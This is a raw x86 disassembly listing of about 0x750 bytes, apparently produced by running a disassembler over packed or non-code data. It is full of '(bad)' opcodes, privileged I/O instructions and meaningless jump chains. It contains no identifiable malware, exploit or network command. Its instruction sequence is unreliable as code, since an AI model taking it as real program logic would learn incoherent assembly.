  40aadc:	mov    edi,0x7666ffe0
  40aae1:	push   0x7a40465a
  40aae6:	pop    edx
  40aae7:	xor    ebp,DWORD PTR [ecx+0x4d]
  40aaea:	cli    
  40aaeb:	dec    eax
  40aaec:	dec    edi
  40aaed:	aaa    
  40aaee:	inc    edi
  40aaef:	imul   esp,DWORD PTR [edi+0x3],0x2038350c
  40aaf6:	sub    al,BYTE PTR [edi]
  40aaf8:	push   edi
  40aaf9:	js     0x40aac2
  40aafb:	fcomip st,st(0)
  40aafd:	pop    ds
  40aafe:	push   edi
  40aaff:	adc    BYTE PTR ss:[edx+0x2f],dl
  40ab03:	adc    eax,0x226f296e
  40ab08:	or     esp,edi
  40ab0a:	xor    ebp,DWORD PTR [esi+0x23]
  40ab0d:	gs stos BYTE PTR es:[edi],al
  40ab0f:	(bad)  
  40ab10:	inc    DWORD PTR ds:0x2b213778
  40ab16:	das    
  40ab17:	xor    al,0x0
  40ab19:	sub    DWORD PTR [edi],esp
  40ab1b:	sbb    DWORD PTR [edi],eax
  40ab1d:	sub    dl,BYTE PTR [ebx]
  40ab1f:	xor    al,BYTE PTR [edi]
  40ab21:	or     eax,DWORD PTR [ebx]
  40ab23:	jns    0x40ab94
  40ab25:	mov    ebx,ds
  40ab27:	jg     0x40aafc
  40ab29:	inc    DWORD PTR [ebp+0x74]
  40ab2c:	emms   
  40ab2e:	dec    esi
  40ab2f:	push   ebp
  40ab30:	jo     0x40aba6
  40ab32:	addr16 inc esp
  40ab34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab35:	push   esi
  40ab36:	or     BYTE PTR [edx],bl
  40ab38:	data16 sbb BYTE PTR [ebx+ebx*1],bl
  40ab3c:	jl     0x40abb7
  40ab3e:	sbb    BYTE PTR [esi+0x66],bl
  40ab41:	loopne 0x40ab42
  40ab43:	mov    edi,0x41175de0
  40ab48:	push   cs
  40ab49:	dec    eax
  40ab4a:	push   ebx
  40ab4b:	sub    cl,BYTE PTR [ebx+0x7a]
  40ab4e:	dec    ebp
  40ab4f:	xor    dh,BYTE PTR [eax+0x72]
  40ab52:	jo     0x40abb0
  40ab54:	jle    0x40abaf
  40ab56:	inc    ecx
  40ab57:	daa    
  40ab58:	and    al,0x5d
  40ab5a:	add    eax,0xba66fa4d
  40ab5f:	pusha  
  40ab60:	ins    DWORD PTR es:[edi],dx
  40ab61:	dec    esi
  40ab62:	cmp    DWORD PTR [ebp-0x6c],edi
  40ab65:	sub    al,0xdc
  40ab67:	or     ah,BYTE PTR [edi]
  40ab69:	or     BYTE PTR [edi],ah
  40ab6b:	sbb    edi,ebx
  40ab6d:	pop    edi
  40ab6e:	jmp    FWORD PTR [edi+0x4d88f994]
  40ab74:	(bad)  
  40ab75:	mov    esi,0x8a3deb50
  40ab7a:	pop    ebp
  40ab7b:	(bad)  
  40ab7c:	jmp    0x40abae
  40ab7e:	mul    esi
  40ab80:	jmp    0x40abdd
  40ab82:	loopne 0x40ab1f
  40ab84:	add    ebp,edi
  40ab86:	push   ebx
  40ab87:	jmp    0x40abad
  40ab89:	jmp    0x40abad
  40ab8b:	jmp    0x40abf5
  40ab8d:	jmp    0x40abab
  40ab8f:	cmp    edi,0xfffffadb
  40ab95:	and    eax,DWORD PTR [edx-0xc]
  40ab98:	xor    BYTE PTR [eax],bl
  40ab9a:	jmp    0x40aba0
  40ab9c:	neg    esi
  40ab9e:	jmp    0x40aba6
  40aba0:	inc    eax
  40aba1:	jmp    0x40abb5
  40aba3:	pop    ebx
  40aba4:	jmp    0x40abc3
  40aba6:	cmp    eax,edx
  40aba8:	jmp    0x40ab81
  40abaa:	jmp    0x40abb1
  40abac:	mov    edi,0x6045fffd
  40abb1:	jmp    0x40abd2
  40abb3:	loop   0x40abe6
  40abb5:	jmp    0x40aba5
  40abb7:	dec    bl
  40abb9:	jmp    0x40abde
  40abbb:	push   ecx
  40abbc:	jmp    0x40ab87
  40abbe:	shr    edx,0x34
  40abc1:	add    eax,0xeb59d5eb
  40abc6:	pop    es
  40abc7:	out    dx,al
  40abc8:	dec    edx
  40abc9:	shr    BYTE PTR [edi+0x12],cl
  40abcc:	dec    ebx
  40abcd:	not    ebx
  40abcf:	jmp    0x40aba0
  40abd1:	pop    eax
  40abd2:	shl    ah,0xad
  40abd5:	arpl   WORD PTR [edi+edi*8+0x5e75c0db],sp
  40abdc:	mov    al,ds:0xf8ebdb84
  40abe1:	mul    edi
  40abe3:	jmp    0x40ab91
  40abe5:	jmp    0x40ab99
  40abe7:	lods   al,BYTE PTR ds:[esi]
  40abe8:	push   0xffffff97
  40abea:	shr    BYTE PTR [edx],0xb7
  40abed:	cwde   
  40abee:	loopne 0x40abf4
  40abf0:	call   0x52dd3399
  40abf5:	iret   
  40abf6:	xor    eax,0xa43ef4b
  40abfb:	cdq    
  40abfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abfd:	sbb    edx,DWORD PTR [esi-0x46]
  40ac00:	dec    esp
  40ac01:	dec    ebx
  40ac02:	scas   eax,DWORD PTR es:[edi]
  40ac03:	adc    esp,DWORD PTR [eax+0x52]
  40ac06:	sub    al,BYTE PTR [ebp-0xe]
  40ac09:	jg     0x40abb3
  40ac0b:	adc    eax,0x333f9d81
  40ac10:	mul    BYTE PTR [ebp-0x4]
  40ac13:	dec    ebx
  40ac14:	cdq    
  40ac15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac16:	inc    edi
  40ac17:	dec    ebp
  40ac18:	mov    bl,0xe3
  40ac1a:	ss mov ah,0x16
  40ac1d:	data16 mov WORD PTR [ebp+0x33e44822],cs
  40ac24:	(bad)  [edi+0x7b6d76f0]
  40ac2a:	mov    esi,0xff02548a
  40ac2f:	xor    dh,bh
  40ac31:	inc    eax
  40ac32:	and    al,0x7d
  40ac34:	cmp    dl,BYTE PTR [ecx+ebx*1]
  40ac37:	jne    0x40ac3e
  40ac39:	es xchg esp,eax
  40ac3b:	cmp    eax,0x41
  40ac3e:	jne    0x40ac26
  40ac40:	mov    WORD PTR [ebp+0x2a],ss
  40ac43:	rcr    BYTE PTR ss:[edx+0x14],cl
  40ac47:	shl    eax,0x6e
  40ac4a:	mov    ds:0xb2b0353d,al
  40ac4f:	add    edx,0x6
  40ac52:	ret    0x86c7
  40ac55:	fldenv [esi+0x6d832008]
  40ac5b:	or     bl,BYTE PTR [esi+0x7c]
  40ac5e:	shl    DWORD PTR [edx-0x11462023],cl
  40ac64:	aad    0x16
  40ac66:	xchg   ebp,eax
  40ac67:	shl    eax,cl
  40ac69:	push   eax
  40ac6a:	pop    esi
  40ac6b:	retfw  0xc3f
  40ac6f:	in     eax,dx
  40ac70:	fs popa 
  40ac72:	hlt    
  40ac73:	sbb    DWORD PTR [esi],0xd2b07980
  40ac79:	and    esi,eax
  40ac7b:	or     BYTE PTR [esi-0x7f],cl
  40ac7e:	into   
  40ac7f:	or     al,0x46
  40ac81:	jp     0x40ac27
  40ac83:	sub    BYTE PTR [edi],0x22
  40ac86:	js     0x40ac56
  40ac88:	mov    BYTE PTR [eax+edx*1],cl
  40ac8b:	inc    DWORD PTR [esi+0x43]
  40ac8e:	pop    esp
  40ac8f:	xchg   DWORD PTR [ebp+esi*1-0x74],esi
  40ac93:	jne    0x667cb212
  40ac99:	xchg   esi,eax
  40ac9a:	xor    DWORD PTR [eax],ebx
  40ac9c:	pushf  
  40ac9d:	push   0xe6eae86f
  40aca2:	xchg   edx,eax
  40aca3:	dec    ebx
  40aca4:	call   0x3271dce9
  40aca9:	clc    
  40acaa:	add    eax,0x354cbfc2
  40acaf:	ss aaa 
  40acb1:	cmp    BYTE PTR [ecx],bh
  40acb3:	inc    ecx
  40acb4:	inc    edx
  40acb5:	inc    ebx
  40acb6:	pusha  
  40acb7:	inc    edi
  40acb8:	dec    eax
  40acb9:	dec    ecx
  40acba:	dec    edx
  40acbb:	dec    ebx
  40acbc:	dec    esp
  40acbd:	call   DWORD PTR [edi+0x51]
  40acc0:	jmp    0x5554:0x53884fac
  40acc7:	push   esi
  40acc8:	push   edi
  40acc9:	pop    eax
  40acca:	pop    ecx
  40accb:	pop    edx
  40accc:	popa   
  40accd:	bound  esp,QWORD PTR [ebx-0xf]
  40acd0:	call   FWORD PTR [ebp-0x1]
  40acd3:	fs gs addr16 pushw 0x6a69
  40acda:	imul   edx,DWORD PTR [eax+0x6e],0x6f
  40acde:	jo     0x40ad51
  40ace0:	jb     0x40ad55
  40ace2:	je     0x40ad59
  40ace4:	jbe    0x40ad5d
  40ace6:	js     0x40ad61
  40ace8:	jp     0x40ad1c
  40acea:	je     0x40ad57
  40acec:	shr    BYTE PTR [edi+eax*1+0x25],0x14
  40acf1:	jae    0x40ad31
  40acf3:	xchg   BYTE PTR [ecx-0x42],cl
  40acf6:	push   edi
  40acf7:	or     al,0x73
  40acf9:	leave  
  40acfa:	iret   
  40acfb:	mov    eax,0x5f20566c
  40ad00:	fcom   QWORD PTR [edi+edx*8]
  40ad03:	ror    BYTE PTR [ebx+0x41],1
  40ad06:	or     eax,0xd62103bd
  40ad0b:	fsub   QWORD PTR [esi]
  40ad0d:	mov    esp,0x2af9a7be
  40ad12:	out    dx,al
  40ad13:	mov    WORD PTR [esi],es
  40ad15:	mov    al,0x57
  40ad17:	pop    esp
  40ad18:	hlt    
  40ad19:	push   ss
  40ad1a:	les    ebx,FWORD PTR [ecx-0x65]
  40ad1d:	int    0xf6
  40ad1f:	ins    BYTE PTR es:[edi],dx
  40ad20:	and    al,0x5c
  40ad22:	pop    ebx
  40ad23:	push   cs
  40ad24:	sub    al,0x5f
  40ad26:	cld    
  40ad27:	pop    esi
  40ad28:	push   0x6cefb4bf
  40ad2d:	ss call 0x1700c5f0
  40ad33:	xor    cl,0x6
  40ad36:	push   eax
  40ad37:	stc    
  40ad38:	mov    ah,0x67
  40ad3a:	sti    
  40ad3b:	or     al,0xc8
  40ad3d:	push   ds
  40ad3e:	fadd   st(7),st
  40ad40:	out    dx,eax
  40ad41:	push   es
  40ad42:	or     ah,al
  40ad44:	lock cmp ch,dh
  40ad47:	mov    ebp,0x364894a7
  40ad4c:	clc    
  40ad4d:	push   cs
  40ad4e:	cmp    BYTE PTR [eax],ch
  40ad50:	mov    esp,0x2d549af9
  40ad55:	into   
  40ad56:	add    al,0x54
  40ad58:	aam    0x16
  40ad5a:	sub    BYTE PTR [eax+eax*8],bh
  40ad5d:	and    eax,0x3b54b0b2
  40ad62:	(bad)  
  40ad63:	(bad)  
  40ad64:	jb     0x40ad02
  40ad66:	in     al,0xcb
  40ad68:	mov    esi,0x37d4b804
  40ad6d:	psubw  mm0,QWORD PTR [ecx-0x48]
  40ad71:	mov    WORD PTR [esi+eax*4],ss
  40ad74:	dec    ebp
  40ad75:	in     al,dx
  40ad76:	mov    eax,0xb8c15b7d
  40ad7b:	pushf  
  40ad7c:	sbb    dh,BYTE PTR [ebp-0x47ed5346]
  40ad82:	lods   al,BYTE PTR ds:[esi]
  40ad83:	jo     0x40ad95
  40ad85:	push   eax
  40ad86:	mov    al,0x1d
  40ad88:	(bad)  
  40ad8a:	ffreep st(5)
  40ad8c:	and    esi,DWORD PTR [edi+0x56fce921]
  40ad92:	call   0x1c9e664f
  40ad97:	lea    ebx,[edi+eiz*4-0x80]
  40ad9b:	or     eax,0x26b8d309
  40ada0:	adc    DWORD PTR ds:0x946dc837,ecx
  40ada6:	loopne 0x40ad60
  40ada8:	les    esp,FWORD PTR [ecx-0x21cfc889]
  40adae:	mov    cl,0xcd
  40adb0:	lea    edx,ds:0xef5a6eb1
  40adb6:	sub    DWORD PTR [ebp+0x6e],ecx
  40adb9:	cmp    BYTE PTR [ecx],al
  40adbb:	cmp    DWORD PTR [ebp+ebx*8-0x45dbc5ff],esp
  40adc2:	inc    edi
  40adc3:	outs   dx,BYTE PTR ds:[esi]
  40adc4:	inc    edi
  40adc5:	mov    edx,0x5bd4edd4
  40adca:	int3   
  40adcb:	mov    ds,esp
  40adcd:	mov    eax,0xa6862e0
  40add2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add3:	fisubr WORD PTR [ecx+0x79]
  40add6:	mov    ds:0x3e8813e0,eax
  40addb:	ja     0x40ad81
  40addd:	sti    
  40adde:	jbe    0x40adf5
  40ade0:	mov    ecx,0xecbafcd1
  40ade5:	jne    0x40add3
  40ade7:	popf   
  40ade8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ade9:	pushf  
  40adea:	inc    esi
  40adeb:	in     eax,0x48
  40aded:	idiv   DWORD PTR [ebx]
  40adef:	mov    WORD PTR [edx+0x63f427f4],?
  40adf5:	hlt    
  40adf6:	xchg   esp,eax
  40adf7:	push   ss
  40adf8:	jb     0x40ae33
  40adfa:	push   esp
  40adfb:	mov    ecx,0x2054d8d
  40ae00:	add    DWORD PTR [esi-0x4390186a],eax
  40ae06:	inc    edx
  40ae07:	adc    BYTE PTR [edi],bh
  40ae09:	push   ecx
  40ae0a:	dec    ecx
  40ae0b:	inc    ebp
  40ae0c:	inc    edx
  40ae0d:	ja     0x40ae76
  40ae0f:	gs out 0xfb,eax
  40ae12:	cmp    BYTE PTR ds:0x646568ef,al
  40ae18:	dec    edi
  40ae19:	add    eax,0xf92f24f2
  40ae1e:	jae    0x40ae6b
  40ae20:	jb     0x40ae89
  40ae22:	ins    DWORD PTR es:[edi],dx
  40ae23:	inc    ebx
  40ae24:	jae    0x40ae7c
  40ae26:	dec    edx
  40ae27:	push   ebp
  40ae28:	add    al,bl
  40ae2a:	iret   
  40ae2b:	pop    ds
  40ae2c:	dec    edi
  40ae2d:	bound  ecx,QWORD PTR [ebp+0x4c]
  40ae30:	fs js  0x40ae7e
  40ae33:	add    BYTE PTR [ecx],al
  40ae35:	repz pop es
  40ae37:	in     al,dx
  40ae38:	mov    ds:0x37408d02,eax
  40ae3d:	xor    dl,BYTE PTR [ebx]
  40ae3f:	mov    eax,eax
  40ae41:	add    cl,bl
  40ae43:	ins    BYTE PTR es:[edi],dx
  40ae44:	scas   eax,DWORD PTR es:[edi]
  40ae45:	mov    ebp,0x23404707
  40ae4a:	es in  al,dx
  40ae4c:	and    al,0xc8
  40ae4e:	sub    ah,bl
  40ae50:	(bad)  
  40ae51:	(bad)  
  40ae52:	dec    ebx
  40ae54:	int3   
  40ae55:	enter  0xd7c9,0xcf
  40ae59:	enter  0xcecd,0xdb
  40ae5d:	fcomp  st(2)
  40ae5f:	fxch   st(2)
  40ae61:	(bad)  
  40ae63:	(bad)  
  40ae65:	loopne 0x40ae48
  40ae67:	jecxz  0x40ae69
  40ae69:	in     al,0xe5
  40ae6b:	pop    esi
  40ae6c:	and    dl,ah
  40ae6e:	sahf   
  40ae6f:	or     BYTE PTR [edi],ch
  40ae71:	xchg   BYTE PTR [edx-0x45],dl
  40ae74:	outs   dx,BYTE PTR ds:[esi]
  40ae75:	add    eax,0x20381a21
  40ae7a:	gs pop ds
  40ae7c:	and    BYTE PTR [ecx],al
  40ae7e:	popa   
  40ae7f:	je     0x40aed9
  40ae81:	or     al,0xb8
  40ae83:	leave  
  40ae84:	and    BYTE PTR [eax],dh
  40ae86:	ds ja  0x40ae5b
  40ae89:	inc    BYTE PTR [esi-0x69cd70d8]
  40ae8f:	pop    ds
  40ae90:	add    BYTE PTR [eax+eax*1],bl
  40ae93:	push   es
  40ae94:	push   ds
  40ae95:	fiadd  DWORD PTR [eax+0x1d136c0d]
  40ae9b:	das    
  40ae9c:	add    eax,esp
  40ae9e:	push   esp
  40ae9f:	test   BYTE PTR [esi+0x706c477c],al
  40aea5:	jns    0x40ae45
  40aea7:	ja     0x40aecb
  40aea9:	fiadd  WORD PTR [esi]
  40aeab:	inc    esi
  40aeac:	add    BYTE PTR [eax-0x40],0x1
  40aeb0:	iret   
  40aeb1:	repz push es
  40aeb3:	add    DWORD PTR [esi],eax
  40aeb5:	add    al,BYTE PTR [ebx]
  40aeb7:	hlt    
  40aeb8:	pusha  
  40aeb9:	les    esp,FWORD PTR [edx+0x6fcbeae]
  40aebf:	popa   
  40aec0:	daa    
  40aec1:	sbb    esp,edi
  40aec3:	mov    eax,ds:0x3f960a26
  40aec8:	data16 repz fidivr DWORD PTR [edi+0x5263400]
  40aed0:	and    eax,0xcc642a2e
  40aed5:	pop    ebp
  40aed6:	inc    esi
  40aed7:	aam    0x6
  40aed9:	fsubr  st(6),st
  40aedb:	repz cmp al,0xcf
  40aede:	in     al,0xec
  40aee0:	hlt    
  40aee1:	cld    
  40aee2:	add    al,0x5e
  40aee4:	sahf   
  40aee5:	out    0x79,eax
  40aee7:	sahf   
  40aee8:	or     al,0x14
  40aeea:	sbb    al,0x24
  40aeec:	sub    al,0x34
  40aeee:	jns    0x40ae8e
  40aef0:	out    0x79,eax
  40aef2:	cmp    al,0x44
  40aef4:	dec    esp
  40aef5:	push   esp
  40aef6:	pop    esp
  40aef7:	out    0x79,eax
  40aef9:	sahf   
  40aefa:	out    0x64,eax
  40aefc:	ins    BYTE PTR es:[edi],dx
  40aefd:	je     0x40af7b
  40aeff:	test   BYTE PTR [esi-0x73618619],bl
  40af05:	xchg   esp,eax
  40af06:	pushf  
  40af07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af08:	lods   al,BYTE PTR ds:[esi]
  40af09:	mov    ah,0x79
  40af0b:	sahf   
  40af0c:	out    0x79,eax
  40af0e:	mov    esp,0xdcd4ccc4
  40af13:	cs js  0x40aeb4
  40af16:	out    0xe4,eax
  40af18:	in     al,dx
  40af19:	hlt    
  40af1a:	add    ah,BYTE PTR [edi-0x6362f3fd]
  40af20:	fmul   QWORD PTR [edi]
  40af22:	add    al,0x5
  40af24:	fs pop ebp
  40af26:	xchg   edx,eax
  40af27:	xchg   ecx,eax
  40af28:	mov    ecx,0xf6a65df
  40af2d:	pusha  
  40af2e:	xchg   ebx,eax
  40af2f:	xchg   ecx,eax
  40af30:	daa    
  40af31:	daa    
  40af32:	mov    eax,0x64c4636c
  40af37:	in     al,0xc9
  40af39:	enter  0x641c,0x74
  40af3d:	sub    BYTE PTR [ebp-0x20],ah
  40af40:	jns    0x40afb4
  40af42:	xor    dh,dl
  40af44:	inc    eax
  40af45:	data16 hlt 
  40af47:	cwde   
  40af48:	dec    esp
  40af49:	mov    ?,WORD PTR [si]
  40af4c:	cdq    
  40af4d:	or     BYTE PTR [eax+0x68646150],ch
  40af53:	add    al,0xe5
  40af55:	and    eax,DWORD PTR [edi+0x18]
  40af58:	imul   eax,ecx,0x1120591e
  40af5e:	mov    ds:0x874c818b,al
  40af63:	mov    edi,0x138779e
  40af68:	pop    ds
  40af69:	pushf  
  40af6a:	call   0xd0fcb5d5
  40af6f:	cmp    al,0xcd
  40af71:	out    0x79,eax
  40af73:	loopne 0x40af65
  40af75:	add    cl,ch
  40af77:	adc    al,0x24
  40af79:	repz cmp al,0xcf
  40af7c:	repz xor al,0x48
  40af7f:	pop    eax
  40af80:	push   0x3cf3cf78
  40af85:	iret   
  40af86:	mov    BYTE PTR [eax-0x2737475c],bl
  40af8c:	jnp    0x40af74
  40af8e:	in     al,dx
  40af8f:	cmp    al,0xec
  40af91:	enter  0x403,0x7
  40af95:	adc    eax,0xc761de76
  40af9a:	es aam 0xf0
  40af9d:	inc    BYTE PTR [esi]
  40af9f:	hlt    
  40afa0:	add    DWORD PTR [ebp+0x5f],eax
  40afa3:	dec    esp
  40afa4:	and    al,0x1a
  40afa6:	popa   
  40afa7:	push   0x3f616d6f
  40afac:	jmp    0x40af9c
  40afae:	rcl    DWORD PTR [ebx],1
  40afb0:	and    BYTE PTR [edx],ch
  40afb2:	inc    ecx
  40afb3:	and    DWORD PTR [eax],esi
  40afb5:	push   cs
  40afb6:	adc    DWORD PTR [edi+ebx*1-0xe],eax
  40afba:	not    DWORD PTR [esi+eiz*4+0x64205480]
  40afc1:	aas    
  40afc2:	add    BYTE PTR [eax],0x74
  40afc5:	inc    eax
  40afc6:	cmp    BYTE PTR [ebp-0x7],ch
  40afc9:	add    BYTE PTR [eax],0x88
  40afcc:	push   cs
  40afcd:	cwde   
  40afce:	sahf   
  40afcf:	mov    ebx,0xa8beee20
  40afd4:	push   cs
  40afd5:	push   esp
  40afd6:	mov    esp,0x7bcc103f
  40afdb:	scas   eax,DWORD PTR es:[edi]
  40afdc:	mov    ebp,0xdc0e1fe7
  40afe1:	jg     0x40aff3
  40afe3:	lock aas 
  40afe5:	and    BYTE PTR [ebx],ch
  40afe7:	aas    
  40afe8:	call   0xff14:0xe9a79f7
  40afef:	and    al,0x2b
  40aff1:	jle    0x40afcf
  40aff3:	xor    al,0xfc
  40aff5:	shr    DWORD PTR [edx],cl
  40aff7:	jmp    FWORD PTR [esi]
  40aff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40affa:	retf   0xf0
  40affd:	dec    esp
  40affe:	sti    
  40afff:	push   cs
  40b000:	pusha  
  40b001:	mov    al,ds:0x7000a4a0
  40b006:	iret   
  40b007:	repz mov esp,0x84620af7
  40b00d:	push   cs
  40b00e:	add    bl,BYTE PTR [esp+ecx*1-0xc30c34c]
  40b015:	cmp    al,0x1
  40b017:	int3   
  40b018:	pmulhuw mm2,QWORD PTR [ecx+edi*2]
  40b01c:	call   0x2c10:0x10f8f3cf
  40b023:	adc    ah,BYTE PTR [ebx+esi*8]
  40b026:	sbb    bl,BYTE PTR [edi+eiz*8+0x50cd3809]
  40b02d:	push   ds
  40b02e:	sbb    edi,DWORD PTR [edi+ecx*8]
  40b031:	jae    0x40b002
  40b033:	fs sbb al,0xaf
  40b036:	push   cs
  40b037:	adc    DWORD PTR [eax-0x30c30cf3],ebp
  40b03d:	repz mov esp,0xe81ad00e
  40b043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b044:	stc    
  40b045:	cmp    al,0xcf
  40b047:	or     edi,esp
  40b049:	add    ebx,DWORD PTR [eax]
  40b04b:	sub    eax,0x79e79e13
  40b050:	sahf   
  40b051:	xor    al,0x18
  40b053:	push   esp
  40b054:	pop    ss
  40b055:	push   0xe79e7904
  40b05a:	jns    0x40b0d8
  40b05c:	push   ds
  40b05d:	mov    WORD PTR ds:0xc1f79ea0,ds
  40b063:	out    0x7,eax
  40b065:	mov    eax,0xcc1fdf2d
  40b06a:	push   ds
  40b06b:	add    ah,bl
  40b06d:	imul   edi,DWORD PTR [esi],0x150ef3cf
  40b073:	lock push ss
  40b075:	or     BYTE PTR [esi],ch
  40b077:	add    eax,0xe79e79e7
  40b07c:	sbb    al,0x6
  40b07e:	xor    BYTE PTR [eax],cl
  40b080:	dec    eax
  40b081:	jns    0x40b021
  40b083:	out    0x75,eax
  40b085:	add    DWORD PTR [eax+0x2a8010e],edx
  40b08b:	shl    bh,0x79
  40b08e:	sahf   
  40b08f:	out    0x4d,eax
  40b091:	fadd   DWORD PTR [eax-0xc307e14]
  40b097:	cmp    al,0xcd
  40b099:	or     BYTE PTR [edi],ch
  40b09b:	and    BYTE PTR [eax],0x86
  40b09e:	cmp    BYTE PTR [eax+0x3cf3cf3c],cl
  40b0a4:	push   eax
  40b0a5:	mov    eax,ds:0xf384a26c
  40b0aa:	cmp    al,0xcf
  40b0ac:	repz mov cl,0x9c
  40b0af:	mov    dl,0xb4
  40b0b1:	mov    edx,0xcf3cf3cf
  40b0b6:	int3   
  40b0b7:	int3   
  40b0b8:	in     al,0xde
  40b0ba:	cld    
  40b0bb:	out    dx,al
  40b0bc:	hlt    
  40b0bd:	mov    eax,0x30143e29
  40b0c2:	mov    edi,0x2e70e30
  40b0c7:	xchg   DWORD PTR [esi],eax
  40b0c9:	sbb    al,0x3c
  40b0cb:	sbb    al,BYTE PTR [edx+eiz*2]
  40b0ce:	push   es
  40b0cf:	push   esi
  40b0d0:	add    edx,esp
  40b0d2:	sar    DWORD PTR [ebx-0x11],0xbd
  40b0d6:	or     edx,DWORD PTR [edx]
  40b0d8:	or     eax,0xc260e22
  40b0dd:	cmovb  ecx,DWORD PTR ss:[ecx]
  40b0e1:	sub    ch,0x36
  40b0e4:	mov    ah,0xc5
  40b0e6:	pop    es
  40b0e7:	jp     0x40b0ea
  40b0e9:	or     BYTE PTR [ecx],0x80
  40b0ec:	adc    edi,esi
  40b0ee:	push   ds
  40b0ef:	push   ds
  40b0f0:	fild   DWORD PTR [eax-0x306960e7]
  40b0f6:	or     eax,eax
  40b0f8:	cmp    eax,0x11ff5bb6
  40b0fd:	call   FWORD PTR [ecx]
  40b0ff:	pop    edi
  40b100:	sub    al,0x3d
  40b102:	inc    ecx
  40b103:	add    DWORD PTR [edx+0x4cf3df3],edi
  40b109:	push   es
  40b10a:	dec    esp
  40b10b:	lock subps xmm1,XMMWORD PTR [esi]
  40b10f:	sar    DWORD PTR [esi],cl
  40b111:	daa    
  40b112:	dec    edi
  40b113:	xor    al,0x74
  40b115:	add    al,0x28
  40b117:	pusha  
  40b118:	dec    esi
  40b119:	test   BYTE PTR [eax],dh
  40b11b:	sar    BYTE PTR [ecx-0x13],0x10
  40b11f:	push   eax
  40b120:	push   cs
  40b121:	in     al,dx
  40b122:	push   ds
  40b123:	or     BYTE PTR [edi-0x35],bl
  40b126:	ret    0xf79
  40b129:	ds jl  0x40b132
  40b12c:	pop    esp
  40b12d:	iret   
  40b12e:	mov    ebx,0x6444ef00
  40b133:	jbe    0x40b101
  40b135:	scas   eax,DWORD PTR es:[edi]
  40b136:	aam    0x4e
  40b138:	sbb    al,0x34
  40b13a:	sbb    BYTE PTR [edi],bl
  40b13c:	lock popf 
  40b13e:	pop    esp
  40b13f:	push   es
  40b140:	sub    al,0x5c
  40b142:	jg     0x40b1b0
  40b144:	psubb  mm6,QWORD PTR [edi+ebx*8]
  40b148:	(bad)  
  40b149:	push   es
  40b14a:	lods   al,BYTE PTR ds:[esi]
  40b14b:	pop    ebp
  40b14c:	fs cmp al,0xf0
  40b14f:	pop    edi
  40b150:	idiv   DWORD PTR [edi+eiz*1+0x667cee49]
  40b157:	or     al,0x3c
  40b159:	out    dx,eax
  40b15a:	fiadd  WORD PTR [ecx]
  40b15c:	idiv   DWORD PTR ds:0xcc06100e
  40b162:	sub    dh,dh
  40b164:	les    dx,DWORD PTR ss:[eax+edi*2]
  40b169:	fdivrp st(3),st
  40b16b:	push   es
  40b16c:	aam    0xbc
  40b16e:	push   ds
  40b16f:	cmp    al,0x84
  40b171:	scas   eax,DWORD PTR es:[edi]
  40b172:	mov    esi,0x34def817
  40b177:	xchg   BYTE PTR [esi+edx*4],bl
  40b17a:	inc    esp
  40b17b:	pop    ebp
  40b17c:	daa    
  40b17d:	test   BYTE PTR [esi],bl
  40b17f:	lock xor BYTE PTR fs:[ebx+0x4f],0x69
  40b185:	xchg   esp,eax
  40b186:	push   cs
  40b187:	push   esp
  40b188:	pop    edi
  40b189:	aas    
  40b18a:	loopne 0x40b16c
  40b18c:	ins    BYTE PTR es:[edi],dx
  40b18d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b18e:	das    
  40b18f:	in     al,dx
  40b190:	addr16 (bad) 
  40b192:	mov    eax,?
  40b194:	sahf   
  40b195:	xor    al,0x33
  40b197:	cwde   
  40b198:	add    dl,BYTE PTR [ebx-0x19]
  40b19b:	adc    al,0x27
  40b19d:	pop    esp
  40b19e:	pop    ds
  40b19f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a0:	test   DWORD PTR [esp+ebx*1],0x74069cde
  40b1a7:	pop    ds
  40b1a8:	lahf   
  40b1a9:	push   ss
  40b1aa:	mov    ah,0x3f
  40b1ac:	sahf   
  40b1ad:	test   BYTE PTR ds:0xf0540e3e,0x8f
  40b1b4:	and    BYTE PTR [eax+0x76],ah
  40b1b7:	pushf  
  40b1b8:	push   esp
  40b1b9:	stc    
  40b1ba:	xor    al,0xdf
  40b1bc:	push   ebx
  40b1bd:	mov    ss,WORD PTR [esi+edx*1]
  40b1c0:	mov    esp,0x5ee41c5c
  40b1c5:	dec    ebp
  40b1c6:	xor    edi,0x8c1e37dc
  40b1cc:	push   cs
  40b1cd:	ins    BYTE PTR es:[edi],dx
  40b1ce:	out    dx,eax
  40b1cf:	inc    esp
  40b1d0:	cmp    eax,0x67c0f34f
  40b1d5:	push   es
  40b1d6:	and    al,0x5d
  40b1d8:	lock ins BYTE PTR es:[edi],dx
  40b1da:	mov    ah,0x29
  40b1dc:	jo     0x40b19c
  40b1de:	out    0x16,eax
  40b1e0:	pushf  
  40b1e1:	cld    
  40b1e2:	jle    0x40b188
  40b1e4:	pop    ebp
  40b1e5:	out    0xcf,eax
  40b1e7:	jnp    0x40b1d8
  40b1e9:	or     BYTE PTR [esi],al
  40b1eb:	je     0x40b22b
  40b1ed:	inc    esp
  40b1ee:	xchg   ah,bl
  40b1f0:	push   es
  40b1f1:	jl     0x40b25f
  40b1f3:	out    dx,al
  40b1f4:	imul   ebx,ebp,0x240e2773
  40b1fa:	xchg   DWORD PTR [ecx+0x66],edx
  40b1fd:	les    ecx,FWORD PTR [edi+esi*1+0x708ee0f2]
  40b204:	dec    esi
  40b205:	jbe    0x40b21f
  40b207:	neg    esi
  40b209:	mov    ah,0xf0
  40b20b:	fidivr WORD PTR [eax]
  40b20d:	lahf   
  40b20e:	jle    0x40b1a4
  40b210:	pop    esp
  40b211:	cs mov esi,0x6288080c
  40b217:	mov    DWORD PTR [edi+0x51014601],edx
  40b21d:	adc    bh,BYTE PTR [esi]
  40b21f:	add    BYTE PTR [eax],dl
  40b221:	rol    DWORD PTR [edi],0x80
  40b224:	inc    ecx
  40b225:	add    BYTE PTR [ecx+esi*4],cl
  40b228:	xor    BYTE PTR ds:[ebp+0x72],0x10
  40b22d:	nop
  40b22e:	inc    ecx
